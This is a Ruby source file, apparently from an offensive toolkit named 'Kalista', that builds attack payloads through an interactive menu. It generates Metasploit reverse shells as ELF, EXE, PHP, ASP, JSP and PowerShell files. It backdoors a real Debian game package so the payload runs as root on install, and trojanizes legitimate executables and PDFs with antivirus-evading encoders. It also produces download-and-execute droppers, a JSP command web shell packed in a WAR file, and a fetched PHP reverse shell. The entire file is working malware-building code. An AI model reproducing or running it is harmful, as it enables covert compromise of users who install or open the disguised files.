# Payloads Builder Class
# This is our PayloadsBuilder Class
# This should house anything related to Building Standalone Payloads
# If you add, just update the usage and p_shell function to make available

class PayloadBuilder
	def initialize
		Dir.mkdir("#{$results}payloads/") unless File.exists?("#{$results}payloads/")
		@results="#{$results}payloads/"
	end

	def show_payloads_usage
		puts "List of available commands and general description".light_yellow + ": ".white
		puts "\tcls".light_yellow + "         => ".white + "Clear Screen".light_yellow
		puts "\thelp ".light_yellow + "       => ".white + "Display this Help Menu".light_yellow
		puts "\tback ".light_yellow + "       => ".white + "Return to Main Menu".light_yellow
		puts "\texit ".light_yellow + "       => ".white + "Exit Completely".light_yellow
		print_line("")
		puts "\telf ".light_yellow + "        => ".white + "Linux ELF Executable".light_yellow
		puts "\tdeb ".light_yellow + "        => ".white + "Linux DEB Installer Package, using: Tint (This is Not Tetris)".light_yellow
		puts "\tweb ".light_yellow + "        => ".white + "ASP, JSP & PHP Web Payloads".light_yellow
		puts "\texe ".light_yellow + "        => ".white + "Windows EXE Executable".light_yellow
		puts "\tpdf ".light_yellow + "        => ".white + "Windows PDF Embedded Payload".light_yellow
		puts "\twar ".light_yellow + "        => ".white + "WAR (Web-Archive) Payloads".light_yellow
		puts "\tdownloader".light_yellow + "  => ".white + "Windows Download & Execute Payload".light_yellow
		puts "\tvbs_down ".light_yellow + "   => ".white + "Windows VBScript Downloader, NO Execution".light_yellow
		puts "\tpowershell".light_yellow + "  => ".white + "Windows PowerShell Payloads".light_yellow
		print_line("")
	end

	#Payloads Builder Main Menu
	def p_shell
		prompt = "(Payloads)> "
		while line = Readline.readline("#{prompt}", true)
			cmd = line.chomp
			case cmd
				when /^clear|^cls|^banner/i
					cls
					banner
					p_shell
				when /^help|^h$|^ls$/i
					show_payloads_usage
					p_shell
				when /^exit|^quit/i
					print_line("")
					print_error("OK, exiting Kalista....")
					print_line("")
					exit 69;
				when /^back|^main/i
					print_line("")
					print_error("OK, back to the Main Menu....")
					print_line("")
					$framework.core_shell
				when /^elf/i
					print_line("")
					elf_payload
					p_shell
				when /^deb/i
					print_line("")
					deb_payload
					p_shell
				when /^web/i
					print_line("")
					web_payload
					p_shell
				when /^exe/i
					print_line("")
					exe_payload
					p_shell
				when /^pdf/i
					print_line("")
					pdf_payload
					p_shell
				when /^war/i
					print_line("")
					war_payload
					p_shell
				when /^downloader/i
					print_line("")
					downloader_payload
					p_shell
				when /^vbs_down/i
					print_line("")
					vbs_down_payload
					p_shell
				when /^powershell|^ps$/i
					print_line("")
					powershell_payload
					p_shell
				else
					cls
					print_line("")
					print_error("Oops, Didn't quite understand that one")
					print_error("Please Choose a Valid Option From Menu Below Next Time.....")
					print_line("")
					show_payloads_usage
					p_shell
				end
		end
	end

	#Linux ELF Executable Payload Builder
	def elf_payload
		print_status("Linux ELF Executable Payload Builder")
		print_caution("Select Build Type: ")
		print_caution("1) x86")
		print_caution("2) x86_64")
		answer=gets.chomp
		if answer == '2'
			payload='linux/x64/shell/reverse_tcp'
		else
			payload='linux/x86/meterpreter/reverse_tcp'
		end
		print_caution("What IP to use for reverse payload: ")
		zIP=gets.chomp

		print_caution("What PORT to listen on for reverse payload: ")
		zPORT=gets.chomp

		print_status("Creating Payload using #{payload} LHOST=#{zIP} LPORT=#{zPORT}......")
		system("#{MSFPATH}/msfvenom -p #{payload} LHOST=#{zIP} LPORT=#{zPORT} -f elf > #{@results}/evil_elf")
		sleep(1)
		print_status("Final Backdoor ELF Executable is ready to go!")
		print_status("You can find it here: #{@results}/evil_elf")
		print_status("May the Force be with you...")
		print_status("")
	end

	# Backdoor Linux DEB Installer Package, using: Tint (This is Not Tetris) package as base
	# As deb packages are installed with sudo or root privs, it yields root shells on target if successful
	# Very effective. but takes some SE work to convince user to install...
	def deb_payload
		print_status("Linux DEB Package Backdoor Payload Builder")
		if File.exists?("#{$temp}nothing2seehere/")
			FileUtils.rm_r("#{$temp}nothing2seehere/")
		end
		Dir.mkdir("#{$temp}nothing2seehere/")
		Dir.mkdir("#{$temp}nothing2seehere/extract") #Storage for us to use and extract some needed files for cloning
		Dir.mkdir("#{$temp}nothing2seehere/build") #Create directory to work and build final payload from
		Dir.mkdir("#{$temp}nothing2seehere/build/DEBIAN") #Required for our final build
		sleep(1)
		print_caution("Select Build Type: ")
		print_caution("1) x86")
		print_caution("2) x86_64")
		answer=gets.chomp
		print_status("Trying to grab the latest sources for Tint now.....")
		if answer == '2'
			payload='linux/x64/shell/reverse_tcp'
			Dir.chdir("#{$temp}nothing2seehere/extract") do 
				system("wget http://ftp.us.debian.org/debian/pool/main/t/tint/tint_0.04+nmu1_amd64.deb 2> /dev/null")
			end
			confirmed='tint_0.04+nmu1_amd64.deb'
			type='x86_64'
		else
			payload='linux/x86/meterpreter/reverse_tcp'
			Dir.chdir("#{$temp}nothing2seehere/extract") do 
				system("wget http://ftp.us.debian.org/debian/pool/main/t/tint/tint_0.04+nmu1_i386.deb 2> /dev/null")
			end
			confirmed='tint_0.04+nmu1_i386.deb'
			type='x86'
		end
		print_caution("What IP to use for reverse payload: ")
		zIP=gets.chomp

		print_caution("What PORT to listen on for reverse payload: ")
		zPORT=gets.chomp

		print_status("Creating Base Payload using #{payload} LHOST=#{zIP} LPORT=#{zPORT}......")
		system("#{MSFPATH}/msfvenom -p #{payload} LHOST=#{zIP} LPORT=#{zPORT} -f elf > #{$temp}nothing2seehere/evil_base")
		Dir.chdir("#{$temp}nothing2seehere/extract") do
			system("dpkg -x #{confirmed} #{$temp}nothing2seehere/build/ &>/dev/null") #Extract for re-build, without output....
			system("ar x #{confirmed}") # extract: x - debian-binary, x - control.tar.gz, x - data.tar.gz
			system('tar xf control.tar.gz') #Extract so we can re-use the control, postinst, & postrm if exists
			FileUtils.cp('control', "#{$temp}nothing2seehere/build/DEBIAN/control") #Clone control file
			if File.exists?('postrm')
				FileUtils.cp('postrm', "#{$temp}nothing2seehere/build/DEBIAN/postrm") #Clone post cleanup file if exists
				File.chmod(0775, "#{$temp}nothing2seehere/build/DEBIAN/postrm")
			end
			postinst=File.open("#{$temp}nothing2seehere/extract/postinst").read #We will 2 append our injection to this......
			#Add our injection to our postinst file....
			if postinst =~ /# End automatically added section/i
				postinst.sub!('# End automatically added section', "sudo chmod 2755 /usr/games/not_tetris && nohup /usr/games/not_tetris >/dev/null 2>&1 & \n# End automatically added section") #Run payload in background with no interupt xD
			else
				postinst += "\nsudo chmod 2755 /usr/games/not_tetris && nohup /usr/games/not_tetris >/dev/null 2>&1 &" #Run payload in background with no interupt xD
			end
			f = File.open("#{$temp}nothing2seehere/build/DEBIAN/postinst", 'w')
			f.puts "#{postinst}" #Write our updated postinst file in our re-build directory
			f.close
			File.chmod(0775, "#{$temp}nothing2seehere/build/DEBIAN/postinst") #chmod our postinst file (I think dpkg handles this if its not properly set but best to be safe.....
		end
		File.rename("#{$temp}nothing2seehere/evil_base", "#{$temp}nothing2seehere/build/usr/games/not_tetris") #move our payload into position
		print_status("Building Final Backdoored DEB Package.....")
		Dir.chdir("#{$temp}nothing2seehere/build/DEBIAN") do
			system("dpkg-deb --build #{$temp}nothing2seehere/build/")
		end
		print_status("Running cleanup.....")
		print_status("Removing all temp files......")
		FileUtils.cp("#{$temp}nothing2seehere/build.deb", "#{@results}/#{type}-evil_tetris.deb")
		FileUtils.rm_r("#{$temp}nothing2seehere/")
		cls
		banner
		print_status("")
		print_status("Backdoored DEB Game Installer Package for Tint (This is Not Tetris) is ready to go!")
		print_status("You can find it here: #{@results}/#{type}-evil_tetris.deb")
		print_status("May the SE Force be with you.....")
		print_status("")
	end

	# Web Based Payloads Builder - ASP, PHP, and JSP WebShell Payloads
	def web_payload
		print_status("Web Based Payloads Builder")
		print_caution("What IP to use for Reverse Payload: ")
		zIP=gets.chomp

		print_caution("What PORT to use for Web Based Reverse Payload: ")
		zPORT=gets.chomp
		while(true)
			print_caution("Select Payload: ")
			print_caution("1) MSF php/meterpreter_reverse_tcp")
			print_caution("2) MSF php/meterpreter/reverse_tcp (staged)")
			print_caution("3) Pentestmonkey's PHP Reverse Shell")
			print_caution("4) MSF ASP Embedded: windows/meterpreter/reverse_tcp")
			print_caution("5) MSF ASP Embedded: windows/x64/meterpreter/reverse_tcp")
			print_caution("6) MSF JSP WebShell: java/jsp_shell_reverse_tcp")
			answer=gets.chomp
			if answer.to_i > 0 and answer.to_i <= 6 #Ensure a valid option was selected or loopback
				if answer.to_i == 1
					payload='php/meterpreter_reverse_tcp'
				elsif answer.to_i == 2
					payload='php/meterpreter/reverse_tcp'
				elsif answer.to_i == 3
					print_status("Grabbing Pentestmonkey PHP Shell & applying a few edits real quick....")

					Dir.chdir("#{$temp}") do
						system('wget http://inf0rm3r.webuda.com/scripts/php-reverse.tar.gz 2> /dev/null; tar xf php-reverse.tar.gz; rm -f php-reverse.tar.gz')
						base=File.open('php-reverse.php').read
						FileUtils.rm('php-reverse.php')
					end
					new=base.sub('$ip = $argv[1];', "$ip = '#{zIP}';").sub('$port = $argv[2];', "$port = #{zPORT.to_i};")
					f=File.open("#{@results}/evil_payload.php", 'w')
					f.puts new
					f.close
					final_payload="#{@results}/evil_payload.php"
				elsif answer.to_i == 4
					payload='windows/meterpreter/reverse_tcp'
				elsif answer.to_i == 5
					payload='windows/x64/meterpreter/reverse_tcp'
				elsif answer.to_i == 6
					payload='java/jsp_shell_reverse_tcp'
				end
				break
			end
		end
		if answer.to_i > 0 and answer.to_i < 3 #MSF Derived PHP Payloads
			print_caution("Base64 Encode our Payload (Y/N)?")
			answer=gets.chomp
			if answer == 'Y' or answer == 'YES'
				str=' -e php/base64 -i 15'
			else
				str=''
			end
			print_status("Creating Base Payload using #{payload} LHOST=#{zIP} LPORT=#{zPORT}......")
			system("#{MSFPATH}/msfvenom -p #{payload} LHOST=#{zIP} LPORT=#{zPORT}#{str} -f raw > #{$temp}/evil_payload.p")
			start='<?php '
			middle=File.open("#{$temp}/evil_payload.p").read
			FileUtils.rm("#{$temp}/evil_payload.p")
			ender=' ?>'
			f=File.open("#{@results}/evil_payload.php", 'w')
			f.puts start + middle + ender
			f.close
			final_payload="#{@results}/evil_payload.php"
		end

		if answer.to_i == 4 or answer.to_i == 5 #MSF Derived PHP Payloads
			print_caution("Try to Encode Payload (Y/N)?")
			answer=gets.chomp
			if answer == 'Y' or answer == 'YES'
				if payload =~ /x64/
					str=' -e x64/xor -i 10 -a 64'
				else
					str=' -e x86/shikata_ga_nai -i 10'
				end
			else
				str=''
			end
			print_status("Creating Payload using #{payload} LHOST=#{zIP} LPORT=#{zPORT}......")
			system("#{MSFPATH}/msfvenom -p #{payload} LHOST=#{zIP} LPORT=#{zPORT}#{str} -f asp > #{@results}/evil_payload.asp")
			final_payload="#{@results}/evil_payload.asp"
		end
		if answer.to_i == 6 #MSF JSP Payload
			print_status("Creating Payload using #{payload} LHOST=#{zIP} LPORT=#{zPORT}......")
			system("#{MSFPATH}/msfvenom -p #{payload} LHOST=#{zIP} LPORT=#{zPORT}#{str} -f raw > #{@results}/evil_payload.jsp")
			final_payload="#{@results}/evil_payload.jsp"
		end
		sleep(2)
		print_status("")
		print_status("Web Payload is ready to go!")
		print_status("You can find it here: #{final_payload}")
		print_status("May the Force be with you.....")
		print_status("")
	end

	# Windows Binary EXE Payload Builder
	def exe_payload
		print_status("Windows Binary EXE Payload Builder")
		print_caution("What IP to use for Winblows Reverse Payload: ")
		zIP=gets.chomp

		print_caution("What PORT to use for Winblows Reverse Payload: ")
		zPORT=gets.chomp

		winz = { '1' => 'windows/meterpreter/reverse_tcp', '2' => 'windows/shell/reverse_tcp', '3' => 'windows/x64/meterpreter/reverse_tcp', '4' => 'windows/x64/shell/reverse_tcp' }
		while(true)
			print_caution("Select Payload: ")
			winz.each {|x,y| print_caution("#{x}) #{y}") }
			answer=gets.chomp
			if answer.to_i > 0 and answer.to_i <= 4
				payload=winz["#{answer.to_i}"]
				break
			end
		end
		while(true)
			print_caution("Select Option: ")
			print_caution("1) Backdoor User Provided EXE")
			print_caution("2) Use one of the Built-In EXE Options")
			answer=gets.chomp
			if answer == '1'
				print_caution("Please provide path to EXE: ")
				user_exe=gets.chomp
				if File.exists?(user_exe)
					FileUtils.cp(user_exe, "#{$temp}safe.exe") unless user_exe == "#{$temp}safe.exe"
					exe="#{$temp}safe.exe"
					break
				else
					print_error("")
					print_error("Can't seem to find the provided file!")
					print_error("Check the path or permissions and try again....")
					print_error("")
				end
			elsif answer == '2'
				good_exe=[ "http://download.oldapps.com/AIM/aim75119.exe", "http://download.oldapps.com/UTorrent/utorrent_3.3_29609.exe", "http://audacity.googlecode.com/files/audacity-win-2.0.3.exe", "https://s3.amazonaws.com/MinecraftDownload/launcher/Minecraft_Server.exe", "http://www.wingrep.com/resources/binaries/WindowsGrep23.exe" ]
#				exe_base = good_exe[rand(4)] #Pick one at random
				exe_base = good_exe[0] #Pick AOL Binary, it seems to work the best - get more stable templates!
				print_status("Grabbing latest version of EXE, one sec......")
				system("wget #{exe_base} -O #{$temp}/safe.exe 2> /dev/null")
				exe="#{$temp}/safe.exe"
				break
			else
				print_error("")
				print_error("Pick a valid option dummy!")
				print_error("")
			end
		end
		print_caution("Do you want to apply basic encoding to payload (Y/N)?")
		answer=gets.chomp
		print_status("Generating payload with #{payload} LHOST=#{zIP} LPORT=#{zPORT}, hang tight a sec.....")
		if answer.upcase == 'N' or answer.upcase == 'NO'
			system("#{MSFPATH}/msfvenom -p #{payload} LHOST=#{zIP} LPORT=#{zPORT} -f exe -x #{exe} > #{@results}/evil_payload.exe")
		else
			if payload =~ /x64/
				system("#{MSFPATH}/msfvenom -p #{payload} LHOST=#{zIP} LPORT=#{zPORT} -e x64/xor -b \\x00 -i 10 -a 64 -f exe -x #{exe} > #{@results}/evil_payload.exe")
			else
				system("#{MSFPATH}/msfvenom -p #{payload} LHOST=#{zIP} LPORT=#{zPORT} --platform windows --arch x86 -e x86/shikata_ga_nai -b \\x00 -i 10 -f exe -x #{exe} > #{@results}/evil_payload.exe")
			end
		end
		FileUtils.rm_f("#{$temp}safe.exe")
		sleep(2)
		cls
		banner
		print_status("")
		print_status("Your EXE Payload is ready to go!")
		print_status("You can find it here: #{@results}/evil_payload.exe")
		print_status("May the Force be with you.....")
		print_status("")
	end

	# Windows PDF Embedded Payload Builder
	def pdf_payload
		print_status("Windows PDF Embedded Payload Builder")
		print_caution("What IP to use for Embedded PDF Reverse Payload: ")
		zIP=gets.chomp

		print_caution("What PORT to use for Embedded PDF Reverse Payload: ")
		zPORT=gets.chomp
		while(true)
			print_caution("Select Option: ")
			print_caution("1) Custom User Provided PDF")
			print_caution("2) Use one of the Built-In PDF Options")
			answer=gets.chomp
			if answer == '1'
				print_caution("Please provide path to PDF: ")
				user_pdf=gets.chomp
				if File.exists?(user_pdf)
					FileUtils.cp(user_pdf, "#{$temp}safe.pdf") unless user_pdf == "#{$temp}safe.pdf"
					pdf="#{$temp}safe.pdf"
					break
				else
					print_error("")
					print_error("Can't seem to find the provided file!")
					print_error("Check the path or permissions and try again....")
					print_error("")
				end
			elsif answer == '2'
				good_pdf=[ "http://www.apache.org/dist/httpd/docs/httpd-docs-2.0.63.en.pdf", "http://downloads.mysql.com/docs/refman-5.6-en.pdf", "http://www.poul.org/wp-content/uploads/2011/11/nginx.pdf", "http://livedocs.adobe.com/coldfusion/8/configuring.pdf", "http://www.cse.psu.edu/~mcdaniel/cse598i-s10/docs/ZendFramework-Tutorial.pdf" ] #Random manuals from the net, msotly tech related....
				pdf_base = good_pdf[rand(4)] #Pick one at random
				print_status("Grabbing latest version of PDF manual, one sec......")
				system("wget #{pdf_base} -O #{$temp}safe.pdf 2> /dev/null")
				pdf="#{$temp}safe.pdf"
				break
			else
				print_error("")
				print_error("Pick a valid option dummy!")
				print_error("")
			end
		end

		winz = { '1' => 'windows/meterpreter/reverse_tcp', '2' => 'windows/x64/meterpreter/reverse_tcp', '3' => 'windows/shell/reverse_tcp', '4' => 'windows/x64/shell/reverse_tcp' }
		while(true)
			print_caution("Select Payload: ")
			winz.each {|x,y| print_caution("#{x}) #{y}") }
			answer=gets.chomp
			if answer.to_i > 0 and answer.to_i <= 4
				payload=winz["#{answer.to_i}"]
				break
			end
		end
		print_status("Generating payload with #{payload} LHOST=#{zIP} LPORT=#{zPORT}, hang tight a sec.....")
		system("#{MSFPATH}/msfcli exploit/windows/fileformat/adobe_pdf_embedded_exe FILENAME=evil_payload.pdf INFILENAME=#{$temp}safe.pdf PAYLOAD=#{payload} LHOST=#{zIP} LPORT=#{zPORT} E")
		FileUtils.mv("#{Dir.home}/.msf4/local/evil_payload.pdf", "#{@results}evil_payload.pdf") #Evil Embedded Payload Done!
		FileUtils.rm_f("#{$temp}safe.pdf") #cleanup of original PDF
		sleep(2)
		cls
		banner
		print_status("")
		print_status("Your PDF Payload is ready to go!")
		print_status("You can find it here: #{@results}evil_payload.pdf")
		print_status("May the SE Force be with you.....")
		print_status("")
	end

	# Windows Download & Exec Payload Builder
	# You give it the URI to a EXE to download and it will build a payload which when run will fetch the file from URI and then execute on target
	# Very good way to deliver additional payloads, RATs, etc...also usually not as flagged by AV as direct payloads sometimes....
	def downloader_payload
		print_status("Windows Download & Exec Payload Builder")
		print_caution("Provide Filename to Save & Run as on Target: ")
		zNAME=gets.chomp

		print_caution("Please provide (pre-encoded) URL to the executable to download & run: ")
		zSITE=gets.chomp

		print_status("Generating payload with #{payload} EXE=#{zNAME} URL=#{zSITE}, hang tight a sec.....")
		system("#{MSFPATH}/msfvenom -p windows/download_exec EXE=#{zNAME} URL=#{zSITE} -f exe > #{@results}downNexec.exe")
		sleep(2)
		print_status("")
		print_status("Your Windows Download & Exec Payload is ready to go!")
		print_status("You can find it here: #{@results}downNexec.exe")
		print_status("May the SE Force be with you.....")
		print_status("")
	end

	# A Simple VBScript Downloader. It doesn't execute anything, but I don't like having to memorize the script to re-write when needed so this helps build initial script which can easily be re-used once on target. Should be helpful since Winblows can be annoying to download files on sometimes....
	def vbs_down_payload
		print_status("Simple VBScript Downloader Script Builder")
		print_caution("Please provide (pre-encoded) URL to the file you want to download: ")
		zSITE=gets.chomp

		print_caution("Provide Name to save file as: ")
		zNAME=gets.chomp

		print_status("Generating downloader.vbs, hang tight a sec.....")
		downloader = "#{@results}downloader.vbs"

		f=File.open(downloader, 'w')
		f.puts "strFileURL = \"#{zSITE}\""
		f.puts "strHDLocation = \"#{zNAME}\""
		f.puts ""
		f.puts "Set objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\")"
		f.puts "objXMLHTTP.open \"GET\", strFileURL, false"
		f.puts "objXMLHTTP.send()"
		f.puts ""
		f.puts "If objXMLHTTP.Status = 200 Then"
		f.puts "Set objADOStream = CreateObject(\"ADODB.Stream\")"
		f.puts "objADOStream.Open"
		f.puts "objADOStream.Type = 1"
		f.puts "objADOStream.Write objXMLHTTP.ResponseBody"
		f.puts "objADOStream.Position = 0"
		f.puts "Set objFSO = Createobject(\"Scripting.FileSystemObject\")"
		f.puts ""
		f.puts "If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation"
		f.puts "Set objFSO = Nothing"
		f.puts "objADOStream.SaveToFile strHDLocation"
		f.puts "objADOStream.Close"
		f.puts "Set objADOStream = Nothing"
		f.puts "End if"
		f.puts ""
		f.puts "Set objXMLHTTP = Nothing"
		f.close

		sleep(2)
		print_status("")
		print_status("Your Windows Downloader Script is ready to go!")
		print_status("You can find it here: #{downloader}")
		print_status("May the SE Force be with you.....")
		print_status("")
	end

	def powershell_payload
		print_status("Windows Powershell Payload Builder")
		print_caution("What IP to use for Winblows PowerShell Reverse Payload: ")
		zIP=gets.chomp

		print_caution("What PORT to use for Winblows PowerShell Reverse Payload: ")
		zPORT=gets.chomp

		winz = { '1' => 'windows/meterpreter/reverse_tcp', '2' => 'windows/shell/reverse_tcp', '3' => 'windows/x64/meterpreter/reverse_tcp', '4' => 'windows/x64/shell/reverse_tcp' }
		while(true)
			print_caution("Select Payload: ")
			winz.each {|x,y| print_caution("#{x}) #{y}") }
			answer=gets.chomp
			if answer.to_i > 0 and answer.to_i <= 4
				payload=winz["#{answer.to_i}"]
				break
			end
		end

		print_status("Generating Base ShellCode for Payload.....")
		#Preps and Builds our PowerShell Command to run our payload in memory upon execution on target.....
		ps_cmd = powershell_builder("-p #{payload} LHOST=#{zIP} LPORT=#{zPORT}")

		print_status("Select output format: ")
		print_status("1) Batch File (.bat)")
		print_status("2) VBScript File (.vbs)")
		print_status("3) Executable File (.exe)")
		answer=gets.chomp
		if answer == '3'
			final_payload="#{@results}evil_PowerShell.exe"
		elsif answer == '2'
			final_payload="#{@results}evil_PowerShell.vbs"
		else
			final_payload="#{@results}evil_PowerShell.bat"
		end

		if final_payload =~ /\.exe/
			print_status("Generating final executable from base shellcode.....")
			if payload =~ /x64/
				final_payload="#{@results}evil_PowerShell-x64.exe"
				system("#{MSFPATH}/msfvenom -p windows/exec CMD='#{ps_cmd}' -e x64/xor -b \\x00 -i 10 -a 64 -f exe > #{final_payload}")
			else
				final_payload="#{@results}evil_PowerShell-x86.exe"
				system("#{MSFPATH}/msfvenom -p windows/exec CMD='#{ps_cmd}' -e x86/shikata_ga_nai -i 10 -f exe > #{final_payload}")
			end
		else
			f=File.open(final_payload, 'w')
			if final_payload =~ /\.bat/
				f.puts "@echo off"
				f.puts ps_cmd
			elsif final_payload =~ /\.vbs/
				f.puts "Set objShell = CreateObject(\"Wscript.shell\")"
				f.puts ""
				f.puts "objShell.exec(\"#{ps_cmd}\")"
			end
			f.close
		end

		sleep(2)
		print_status("")
		print_status("Your Windows PowerShell Payload is ready to go!")
		print_status("You can find it here: #{final_payload}")
		print_status("May the Force be with you.....")
		print_status("")
	end

	# Web Archive (WAR) Payload Builder
	# Handy for deliverying payloads to Java Applications like TomCat and JBOSS Servers
	# Basically just wrap up a JSP payload file in WAR formatting to upload & extract on server
	def war_payload
		if Dir.exists?("#{$temp}warbuilder")
			FileUtils.rm_r("#{$temp}warbuilder")
			Dir.mkdir("#{$temp}warbuilder")
		else
			Dir.mkdir("#{$temp}warbuilder")
		end
		while(true)
			print_status("Web-Archive (WAR) Payload Builder")
			print_caution("Select Option: ")
			print_caution("1) Build WAR with Simple JSP CMD Exec Web Shell")
			print_caution("2) Build WAR with Metasploit Reverse Shell")
			print_caution("3) Build WAR with Metasploit Bind Shell")
			answer=gets.chomp
			if answer.to_i > 0 and answer.to_i <= 3
				if answer.to_i == 2
					print_caution("What IP to use for JSP Reverse Payload: ")
					zIP=gets.chomp

					print_caution("What PORT to use for JSP Reverse Payload: ")
					zPORT=gets.chomp

					reverse_jsp_shell(zIP, zPORT)
				elsif answer.to_i == 3
					print_caution("What PORT to use for JSP Bind Payload: ")
					zPORT=gets.chomp

					bind_jsp_shell(zPORT)
				else
					simple_jsp_shell
				end
				break
			else
				print_error("")
				print_error("Pick a valid option dummy!")
				print_error("")
			end
		end
		inf_build
		print_status("Generating WAR Archive with payload......")
		Dir.chdir("#{$temp}warbuilder/") {
			system("jar cvf pwnsauce.war WEB-INF/ cmd.jsp")
		}
		if answer.to_i == 2
			final="#{@results}pwnsauce_rev.war"
		elsif answer.to_i == 3
			final="#{@results}pwnsauce_bind.war"
		else
			final="#{@results}pwnsauce.war"
		end
		FileUtils.mv("#{$temp}/warbuilder/pwnsauce.war", final)
		sleep(2)
		print_status("")
		print_status("Web Archive (WAR) Payload is ready to go!")
		print_status("")
		print_caution("Do you want to create HTTP Server to make available for download (Y/N)?")
		answer=gets.chomp
		if answer.upcase == 'Y' or answer.upcase == 'YES'
			if Dir.exists?("#{$temp}warbuilder/downloads")
				FileUtils.rm_r("#{$temp}warbuilder/downloads")
				Dir.mkdir("#{$temp}warbuilder/downloads")
			else
				Dir.mkdir("#{$temp}warbuilder/downloads")
			end
			FileUtils.cp(final, "#{$temp}warbuilder/downloads/")
			zROOT="#{$temp}warbuilder/downloads/"

			include WEBrick    # let's import the namespace so we don't have to keep typing 'WEBrick::' everywhere

			print_caution("What PORT to use for Temporary HTTP Server: ")
			zPORT=gets.chomp

			print_status("Starting up temporary HTTP Server on: 0.0.0.0:#{zPORT}")
			print_status("Use 'CTRL+C' to Stop the HTTP Server when done!")
			print_status("")
			server = WEBrick::HTTPServer.new :Port => zPORT, :DocumentRoot => zROOT
			trap("INT") { puts "\nSYSTEM INTERUPT RECEIVED!\nShutting Down Temporary HTTP Server......\n.............\n........\n.....\n...\n.\n"; server.shutdown }
			server.start
			print_status("")
			print_status("OK HTTP Server stopped, You can find the evil WAR archive we originally created here: #{final}")
			print_status("May the Force be with you.....")
		else
			print_status("OK, You can find the evil WAR archive here: #{final}")
			print_status("May the Force be with you.....")
		end
		FileUtils.rm_r("#{$temp}/warbuilder/")
		print_status("")
	end

	#Build Simple JSP Web Shell
	def simple_jsp_shell
		puts "Creating base JSP Payload using simple JSP Web Shell......"
		jsp_shell = '<%@ page import="java.util.*,java.io.*"%>
<%
%>
<HTML><BODY>
Commands with JSP
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
out.println("Command: " + request.getParameter("cmd") + "<BR>");
Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
OutputStream os = p.getOutputStream();
InputStream in = p.getInputStream();
DataInputStream dis = new DataInputStream(in);
String disr = dis.readLine();
while ( disr != null ) {
out.println(disr);
disr = dis.readLine();
}
}
%>
</pre>
</BODY></HTML>'

		f=File.open("#{$temp}warbuilder/cmd.jsp", 'w')
		f.puts jsp_shell
		f.close
	end

	#Build MSF Reverse JSP Web Shell
	def reverse_jsp_shell(ip, port)
		puts "Creating base JSP Payload using java/jsp_shell_reverse_tcp LHOST=#{ip} LPORT=#{port}......"
		system("#{MSFPATH}/msfvenom -p java/jsp_shell_reverse_tcp LHOST=#{ip} LPORT=#{port} -f raw > #{$temp}warbuilder/cmd.jsp")
	end

	#Build MSF BIND JSP Web Shell
	def bind_jsp_shell(port)
		puts "Creating base JSP Payload using java/jsp_shell_bind_tcp LPORT=#{port}......"
		system("#{MSFPATH}/msfvenom -p java/jsp_shell_bind_tcp LPORT=#{port} -f raw > #{$temp}warbuilder/cmd.jsp")
	end

	#Needed WEB-INF/ & web.xml file 
	def inf_build
		if Dir.exists?("#{$temp}warbuilder/WEB-INF")
			FileUtils.rm_r("#{$temp}warbuilder/WEB-INF")
			Dir.mkdir("#{$temp}warbuilder/WEB-INF")
		else
			Dir.mkdir("#{$temp}warbuilder/WEB-INF")
		end
		web_inf_xml = '<?xml version="1.0" ?>
<web-app xmlns="http://java.sun.com/xml/ns/j2ee"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee
http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd"
version="2.4">
<servlet>
<servlet-name>PwnSauce</servlet-name>
<jsp-file>/cmd.jsp</jsp-file>
</servlet>
</web-app>'

		f=File.open("#{$temp}warbuilder/WEB-INF/web.xml", 'w')
		f.puts web_inf_xml
		f.close
	end
end
